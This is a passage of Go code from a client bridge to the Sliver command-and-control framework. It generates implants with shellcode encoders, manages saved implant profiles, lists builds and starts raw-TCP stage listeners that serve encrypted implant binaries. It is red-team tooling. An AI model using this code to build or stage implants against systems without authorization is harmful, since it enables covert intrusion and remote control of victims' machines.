	for arch, archMap := range resp.GetEncoders() {
		names := make([]string, 0, len(archMap.GetEncoders()))
		for name := range archMap.GetEncoders() {
			names = append(names, name)
		}
		sort.Strings(names)
		out[arch] = names
	}
	return out, nil
}

// badRequest marks an error as caused by the caller's input rather than by the
// Sliver server, so handlers can answer 400 instead of the blanket 502 they use
// for anything coming back over gRPC.
type badRequest struct{ error }

func isBadRequest(err error) bool {
	var b badRequest
	return errors.As(err, &b)
}

// resolveShellcodeEncoder maps an operator-chosen encoder name to the enum the
// server expects, rejecting names that are not compatible with the target arch.
// An empty name, "none", or a non-shellcode format all mean "no encoding".
func (s *Sliver) resolveShellcodeEncoder(opts GenerateOptions) (clientpb.ShellcodeEncoder, error) {
	name := strings.ToLower(strings.TrimSpace(opts.ShellcodeEncoder))
	name = strings.ReplaceAll(name, "-", "_")
	if name == "" || name == "none" {
		return clientpb.ShellcodeEncoder_NONE, nil
	}
	if outputFormat(opts.Format) != clientpb.OutputFormat_SHELLCODE {
		// Silently dropping this would build something the operator did not ask
		// for; the console warns and continues, but a GUI can afford to object.
		return clientpb.ShellcodeEncoder_NONE, badRequest{fmt.Errorf("shellcode encoder %q requires the shellcode output format", opts.ShellcodeEncoder)}
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.ShellcodeEncoderMap(ctx, &commonpb.Empty{})
	if err != nil {
		return clientpb.ShellcodeEncoder_NONE, err
	}
	arch := normalizeShellcodeArch(opts.Arch)
	archMap := resp.GetEncoders()[arch]
	if archMap == nil {
		return clientpb.ShellcodeEncoder_NONE, badRequest{fmt.Errorf("no shellcode encoders available for %s", arch)}
	}
	encoder, ok := archMap.GetEncoders()[name]
	if !ok {
		return clientpb.ShellcodeEncoder_NONE, badRequest{fmt.Errorf("shellcode encoder %q is not compatible with %s", opts.ShellcodeEncoder, arch)}
	}
	return encoder, nil
}

// normalizeShellcodeArch folds the arch aliases Sliver accepts onto the keys
// used by the encoder map (mirrors the identically named client helper).
func normalizeShellcodeArch(arch string) string {
	switch strings.ToLower(strings.TrimSpace(arch)) {
	case "amd64", "x64", "x86_64":
		return "amd64"
	case "386", "x86", "i386":
		return "386"
	case "arm64", "aarch64":
		return "arm64"
	default:
		return strings.ToLower(strings.TrimSpace(arch))
	}
}

// namedPipeURL normalizes an operator-entered pipe path (Windows-style
// \\.\pipe\Name, or already a namedpipe:// URL) into the namedpipe:// scheme
// Sliver's C2 parser expects.
func namedPipeURL(raw string) string {
	p := strings.ToLower(strings.TrimSpace(raw))
	p = strings.ReplaceAll(p, `\`, "/")
	p = strings.TrimPrefix(p, "/")
	p = strings.TrimPrefix(p, "/")
	if strings.HasPrefix(p, "namedpipe://") {
		return p
	}
	return "namedpipe://" + p
}

func (s *Sliver) Generate(opts GenerateOptions) (*clientpb.Generate, error) {
	encoder, err := s.resolveShellcodeEncoder(opts)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()
	return s.rpc.Generate(ctx, &clientpb.GenerateReq{Name: opts.Name, Config: buildImplantConfig(opts, encoder)})
}

// ---- Implant profiles (saved generate configs) ----

// Profiles lists the server's saved implant profiles.
func (s *Sliver) Profiles() ([]*clientpb.ImplantProfile, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.ImplantProfiles(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	return resp.Profiles, nil
}

// SaveProfile creates or updates (by name) a saved implant profile.
func (s *Sliver) SaveProfile(name string, opts GenerateOptions) (*clientpb.ImplantProfile, error) {
	encoder, err := s.resolveShellcodeEncoder(opts)
	if err != nil {
		return nil, err
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.SaveImplantProfile(ctx, &clientpb.ImplantProfile{Name: name, Config: buildImplantConfig(opts, encoder)})
}

// DeleteProfile removes a saved implant profile by name.
func (s *Sliver) DeleteProfile(name string) error {
	ctx, cancel := ctxTimeout()
	defer cancel()
	_, err := s.rpc.DeleteImplantProfile(ctx, &clientpb.DeleteReq{Name: name})
	return err
}

// ---- Stage listeners (raw-TCP handoff of a profile's full implant binary) ----

// StartStageListener builds the (optionally compressed/encrypted) implant
// binary for the named profile and starts a raw TCP job serving it to any
// stager that connects — Sliver's "stage-listener" console command, driven
// over gRPC instead of shelling out.
func (s *Sliver) StartStageListener(host string, port uint32, profile, aesKey, aesIV, rc4Key, compress string) (*clientpb.StagerListener, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	stage, err := s.rpc.GenerateStage(ctx, &clientpb.GenerateStageReq{
		Profile:       profile,
		AESEncryptKey: aesKey,
		AESEncryptIv:  aesIV,
		RC4EncryptKey: rc4Key,
		PrependSize:   true, // required framing for a raw-TCP stager
		Compress:      strings.ToLower(compress),
	})
	if err != nil {
		return nil, fmt.Errorf("build stage from profile %q: %w", profile, err)
	}
	ctx2, cancel2 := ctxTimeout()
	defer cancel2()
	return s.rpc.StartTCPStagerListener(ctx2, &clientpb.StagerListenerReq{
		Protocol:    clientpb.StageProtocol_TCP,
		Host:        host,
		Port:        port,
		ProfileName: profile,
		Data:        stage.GetFile().GetData(),
	})
}

// ---- Implant builds (previously generated artifacts) ----

// ImplantBuildInfo summarizes one server-side build record for the Implants tab.
type ImplantBuildInfo struct {
	Name   string
	Config *clientpb.ImplantConfig
	Staged bool
}

// Builds lists every implant previously built on the server.
func (s *Sliver) Builds() ([]ImplantBuildInfo, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.ImplantBuilds(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]ImplantBuildInfo, 0, len(resp.Configs))
	for name, cfg := range resp.Configs {
		out = append(out, ImplantBuildInfo{Name: name, Config: cfg, Staged: resp.Staged[name]})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
	return out, nil
}

// defaultExports mirrors the sliver-client `--exports` flag default. It is
// inert for exe/DLL builds, but linux and darwin shellcode *require* a
// non-empty list — the server takes Exports[0] as the entry symbol and
// otherwise fails with "shellcode requires at least one export symbol". The
// bridge previously left this unset, which is why non-Windows shellcode could
// never be built here.
var defaultExports = []string{"StartW", "VoidFunc", "DllInstall", "DllRegisterServer", "DllUnregisterServer"}

func outputFormat(f string) clientpb.OutputFormat {
	switch f {
	case "shared":
		return clientpb.OutputFormat_SHARED_LIB
	case "shellcode":
		return clientpb.OutputFormat_SHELLCODE
	case "service":
		return clientpb.OutputFormat_SERVICE
	default:
		return clientpb.OutputFormat_EXECUTABLE
	}
}

// Events streams server events (session/beacon connect, job stop, etc.).
func (s *Sliver) Events(ctx context.Context) (rpcpb.SliverRPC_EventsClient, error) {
	return s.rpc.Events(ctx, &commonpb.Empty{})
}

// AESEncryptionResult contains the encrypted payload and the encryption keys.



